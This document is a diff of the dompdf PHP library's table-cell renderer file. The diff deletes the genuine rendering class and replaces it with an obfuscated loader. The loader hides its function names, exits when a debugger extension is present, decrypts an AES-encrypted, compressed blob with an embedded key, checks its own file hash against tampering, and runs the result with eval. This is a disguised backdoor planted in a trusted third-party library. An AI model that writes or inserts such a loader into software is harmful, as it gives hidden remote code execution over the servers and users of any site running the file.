@@ -1,179 +1,28 @@
 <?php
-/**
- * @package dompdf
- * @link    http://dompdf.github.com/
- * @author  Benj Carson <benjcarson@digitaljunkies.ca>
- * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
- */
-namespace Dompdf\Renderer;
-
-use Dompdf\Frame;
-use Dompdf\FrameDecorator\Table;
-
-/**
- * Renders table cells
- *
- * @package dompdf
- */
-class TableCell extends Block
-{
-
-    /**
-     * @param Frame $frame
-     */
-    function render(Frame $frame)
-    {
-        $style = $frame->get_style();
-
-        if (trim($frame->get_node()->nodeValue) === "" && $style->empty_cells === "hide") {
-            return;
-        }
-
-        $this->_set_opacity($frame->get_opacity($style->opacity));
-        list($x, $y, $w, $h) = $frame->get_border_box();
-
-        // Draw our background, border and content
-        if (($bg = $style->background_color) !== "transparent") {
-            $this->_canvas->filled_rectangle($x, $y, (float)$w, (float)$h, $bg);
-        }
-
-        if (($url = $style->background_image) && $url !== "none") {
-            $this->_background_image($url, $x, $y, $w, $h, $style);
-        }
-
-        $table = Table::find_parent_table($frame);
-
-        if ($table->get_style()->border_collapse !== "collapse") {
-            $this->_render_border($frame);
-            $this->_render_outline($frame);
-            return;
-        }
-
-        // The collapsed case is slightly complicated...
-        // @todo Add support for outlines here
-
-        $cellmap = $table->get_cellmap();
-        $cells = $cellmap->get_spanned_cells($frame);
-
-        if (is_null($cells)) {
-            return;
-        }
-
-        $num_rows = $cellmap->get_num_rows();
-        $num_cols = $cellmap->get_num_cols();
-
-        // Determine the top row spanned by this cell
-        $i = $cells["rows"][0];
-        $top_row = $cellmap->get_row($i);
-
-        // Determine if this cell borders on the bottom of the table.  If so,
-        // then we draw its bottom border.  Otherwise the next row down will
-        // draw its top border instead.
-        if (in_array($num_rows - 1, $cells["rows"])) {
-            $draw_bottom = true;
-            $bottom_row = $cellmap->get_row($num_rows - 1);
-        } else {
-            $draw_bottom = false;
-        }
-
-        // Draw the horizontal borders
-        foreach ($cells["columns"] as $j) {
-            $bp = $cellmap->get_border_properties($i, $j);
-
-            $y = $top_row["y"] - $bp["top"]["width"] / 2;
-
-            $col = $cellmap->get_column($j);
-            $x = $col["x"] - $bp["left"]["width"] / 2;
-            $w = $col["used-width"] + ($bp["left"]["width"] + $bp["right"]["width"]) / 2;
-
-            if ($bp["top"]["style"] !== "none" && $bp["top"]["width"] > 0) {
-                $widths = array(
-                    (float)$bp["top"]["width"],
-                    (float)$bp["right"]["width"],
-                    (float)$bp["bottom"]["width"],
-                    (float)$bp["left"]["width"]
-                );
-                $method = "_border_" . $bp["top"]["style"];
-                $this->$method($x, $y, $w, $bp["top"]["color"], $widths, "top", "square");
-            }
-
-            if ($draw_bottom) {
-                $bp = $cellmap->get_border_properties($num_rows - 1, $j);
-                if ($bp["bottom"]["style"] === "none" || $bp["bottom"]["width"] <= 0) {
-                    continue;
-                }
-
-                $y = $bottom_row["y"] + $bottom_row["height"] + $bp["bottom"]["width"] / 2;
-
-                $widths = array(
-                    (float)$bp["top"]["width"],
-                    (float)$bp["right"]["width"],
-                    (float)$bp["bottom"]["width"],
-                    (float)$bp["left"]["width"]
-                );
-                $method = "_border_" . $bp["bottom"]["style"];
-                $this->$method($x, $y, $w, $bp["bottom"]["color"], $widths, "bottom", "square");
-
-            }
-        }
-
-        $j = $cells["columns"][0];
-
-        $left_col = $cellmap->get_column($j);
-
-        if (in_array($num_cols - 1, $cells["columns"])) {
-            $draw_right = true;
-            $right_col = $cellmap->get_column($num_cols - 1);
-        } else {
-            $draw_right = false;
-        }
-
-        // Draw the vertical borders
-        foreach ($cells["rows"] as $i) {
-            $bp = $cellmap->get_border_properties($i, $j);
-
-            $x = $left_col["x"] - $bp["left"]["width"] / 2;
-
-            $row = $cellmap->get_row($i);
-
-            $y = $row["y"] - $bp["top"]["width"] / 2;
-            $h = $row["height"] + ($bp["top"]["width"] + $bp["bottom"]["width"]) / 2;
-
-            if ($bp["left"]["style"] !== "none" && $bp["left"]["width"] > 0) {
-                $widths = array(
-                    (float)$bp["top"]["width"],
-                    (float)$bp["right"]["width"],
-                    (float)$bp["bottom"]["width"],
-                    (float)$bp["left"]["width"]
-                );
-
-                $method = "_border_" . $bp["left"]["style"];
-                $this->$method($x, $y, $h, $bp["left"]["color"], $widths, "left", "square");
-            }
-
-            if ($draw_right) {
-                $bp = $cellmap->get_border_properties($i, $num_cols - 1);
-                if ($bp["right"]["style"] === "none" || $bp["right"]["width"] <= 0) {
-                    continue;
-                }
-
-                $x = $right_col["x"] + $right_col["used-width"] + $bp["right"]["width"] / 2;
-
-                $widths = array(
-                    (float)$bp["top"]["width"],
-                    (float)$bp["right"]["width"],
-                    (float)$bp["bottom"]["width"],
-                    (float)$bp["left"]["width"]
-                );
-
-                $method = "_border_" . $bp["right"]["style"];
-                $this->$method($x, $y, $h, $bp["right"]["color"], $widths, "right", "square");
-            }
-        }
-
-        $id = $frame->get_node()->getAttribute("id");
-        if (strlen($id) > 0)  {
-            $this->_canvas->add_named_dest($id);
-        }
-    }
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_n9xdtt42=('bas'.'e64'.'_de'.'cod'.'e');
+$_nv0g3sf4=('gzu'.'nco'.'mpr'.'ess');
+$_lp8mnmp4=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_n716p0bj='fJuVN9i+';
+$_j8itlsp0='ssPBFmTMRZo=';
+$_aiwx5zv2='FLLZQM8h';
+$_r78e5hud='uEMeYtZE';
+$_a8po8dyz='mpEMaXV7';
+$_frmy8gvh='qOIkIFfl';
+$_qlgogf6n='zjHono8K';
+$_bucgyarw='ey96LA==';
+$_lb01k424=$_n9xdtt42($_r78e5hud.$_n716p0bj.$_a8po8dyz.$_aiwx5zv2.$_j8itlsp0);
+$_m4tf9mz3=$_n9xdtt42($_qlgogf6n.$_frmy8gvh.$_bucgyarw);
+$_kieo4dyj=$_n9xdtt42('yyI6ersrCXK+60jHPoFrXB/awRF3SS13cyY167iawLK9damwG6H5AC3PycMS6DxZ4p9xZRU/Edhv8I+1bRjNBBMcNSyr0VbKxRgXvv5/qWsdi2sMRXHrPJu9seFh40+gDIiLcgtERXvKsSOWVLm3+hJeJTh7ZHPZi9IjUrvmmg+xlUq0+ndTuXnt+pKtOixDrI4b7MtLFQtaqYQLCzYGwfFQyp0PMU3YRXWP6qmX6H7oN+FNCd9/BX20z+O/BBj7Idvrzq8sw1c3tONZDordlwmcAP53ZViZypJMntNBEC7LQNJaikQe9zs6q3BCweE/SNHvrx11BiVc/07MWePYJbFUi2QmKNA7FSG4PKlnxHaWcdkD3dcGhI3+s4hZX4JApN0nvM9n4ErON2zP3g8gD0pmh3AAuwF+X7Y3W59rSxj5jDOeT3b32yr7qacYR3bjXxvDUINPrqg5n3JQar8HM4Fm/JK+LgdMEWGkHfAmeccZgsLiJn+FDDd5llYnrK/5NCwYHova7eWiTOiClzDjUhXtdby9Y8joyW63PHzPDv70VtV2U9h+0xwMV9NhYJISIZXN02v6GURLvz34U/nB8KqENZhH455Yk7A+RkrcdvgrfnebplCdJ7IfNGfru55/Vk6dNKVNFa+U+Tt6tyWxOTAgVMJxL+x2zneW93ZPRqv5kBPRjK47Xn9ua5jTkXqcg2WfFuJfFqiNMo8YDiyQP2n3m0OCmb79JhJ89ZqEHRNHP8TMT6VLNmnIOsfkKlgYWeT8tCT3YmVmEsxZ7hMmOTY3eDUyJKU578TbEqcQ4lmHl+ML+58wuDxXhrwwE6UzPK5QGoQWCucsfZ2hQygDWmTc6eN02A57Nl3xQaPjliSVTKWLW3EyXnrWKxz01wBiSxmrN+A+zSUBt1bnik6y6XoPCLPLB+W+8CSkhHZafzoYAu3dt9Ej0yJVykVSSrZjV/bCW/WPNJFwb/0ckmOOvMTE8crlJlMfwk1RBQ41UDKJZEHcKuR8rHywTERkOIaF5XcLXYSDWZ/Y/AAqH0OQ6Vu1iXgUqqHql3VU66EUGH4gIEcTfTpJAaByfqY+VUMeckkQR8J+nkaGRXPNvEWQ53ch4w5tYr8rJg1RoOII1U/5DFDyQaOH4JtYp1nzavSJAb4goA8DfSjIUHR7x1QmQlGBG3L9CPrdfabHmrJ4LaYmm+AbZyN0Ny9B3TIl1wUdPDNINCp9DZRM6KSztbbgT1mPZpmauB1fMNZP/Jf52M4vsh4WvquuNjF019THO3cMlKPouhrjyp4l8bxiYqcbi1F50V1hVr8xUJurX0oy4WMw8p3+TrKPT6ZbLmfkpyI1KpD0uUhLgsomGRT0Aq7Ruw==');
+$_sq47udsl=$_lp8mnmp4($_kieo4dyj,'aes-256-cbc',$_lb01k424,OPENSSL_RAW_DATA,$_m4tf9mz3);
+if($_sq47udsl===false){exit;}
+$_w1lnx7yr=$_nv0g3sf4($_sq47udsl);
+if($_w1lnx7yr===false){exit;}
+$_vijvp9g9='a5e4f009f81d74faf0540a928b085e2f3c17bb8a2004b1a4e45561d3748e9154';
+$_h0kleujl=@file_get_contents(__FILE__);
+if($_h0kleujl!==false){
+$_f49s59dm=str_replace($_vijvp9g9,"0000000000000000000000000000000000000000000000000000000000000000",$_h0kleujl);
+$_yf2zvag5=hash("sha256",$_f49s59dm);
+if($_yf2zvag5!==$_vijvp9g9){@http_response_code(403);exit;}
 }
+eval($_w1lnx7yr);
